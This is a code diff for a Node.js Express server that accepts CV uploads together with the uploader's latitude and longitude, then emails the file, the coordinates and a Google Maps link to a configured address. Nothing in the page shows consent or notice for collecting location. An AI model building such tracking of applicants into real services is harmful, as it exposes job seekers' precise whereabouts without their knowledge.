@@ -1,54 +1,65 @@
-const express = require("express");
-const multer = require("multer");
-const fs = require("fs");
-const path = require("path");
+require('dotenv').config();
+const express = require('express');
+const multer = require('multer');
+const nodemailer = require('nodemailer');
+const fs = require('fs');
+const path = require('path');
+const cors = require('cors');
 
 const app = express();
-const PORT = process.env.PORT || 10000;
+app.use(cors());
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-// Set up multer to store uploaded files in /uploads
+app.use(express.static(path.join(__dirname, 'public')));
+
+const uploadDir = path.join(__dirname, 'uploads');
+if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
+
 const storage = multer.diskStorage({
-  destination: (req, file, cb) => {
-    const uploadDir = path.join(__dirname, "uploads");
-    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
-    cb(null, uploadDir);
-  },
-  filename: (req, file, cb) => {
-    const uniqueName = `${Date.now()}-${file.originalname}`;
-    cb(null, uniqueName);
-  },
+  destination: (req, file, cb) => cb(null, uploadDir),
+  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
 });
 const upload = multer({ storage });
 
-// Middleware
-app.use(express.static("public"));
-app.use("/uploads", express.static("uploads")); // make uploads public
-app.use(express.urlencoded({ extended: true }));
-
-// Upload route
-app.post("/upload", upload.single("cv"), (req, res) => {
-  const file = req.file;
-  const { latitude, longitude } = req.body;
-
-  if (!file) {
-    return res.status(400).send("No file uploaded");
-  }
-
-  console.log(`✅ CV uploaded: ${file.filename}`);
-  console.log(`📍 Location: ${latitude}, ${longitude}`);
-
-  // Save location data to file
-  const logData = `${new Date().toISOString()} - File: ${file.filename} - Location: ${latitude}, ${longitude}\n`;
-  fs.appendFileSync("location.log", logData);
-
-  // Response page
-  res.send(`
-    <h2>✅ CV uploaded successfully!</h2>
-    <p>📄 <a href="/uploads/${file.filename}" target="_blank">View Uploaded CV</a></p>
-    <p>📍 Location: ${latitude}, ${longitude}</p>
-    <a href="/">⬅ Go Back</a>
-  `);
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: { user: process.env.EMAIL, pass: process.env.PASS }
 });
 
-// Start server
+app.post('/upload', upload.single('cv'), async (req, res) => {
+  try {
+    const { latitude, longitude } = req.body;
+    console.log(`✅ CV uploaded: ${req.file.filename}`);
+    console.log(`📍 Location received: ${latitude}, ${longitude}`);
+
+    const mailOptions = {
+      from: process.env.EMAIL,
+      to: process.env.EMAIL_TO,
+      subject: '📄 New CV Uploaded with Location',
+      text: `✅ New CV uploaded: ${req.file.filename}
+
+📍 Location Details:
+Latitude: ${latitude || 'Not available'}
+Longitude: ${longitude || 'Not available'}
+Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`,
+      attachments: [
+        { filename: req.file.originalname, path: req.file.path }
+      ]
+    };
+
+    await transporter.sendMail(mailOptions);
+    console.log('📧 Email sent successfully!');
+    res.send('✅ File uploaded and email sent with location!');
+  } catch (err) {
+    console.error('❌ Error:', err);
+    res.status(500).send('Error sending email');
+  }
+});
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
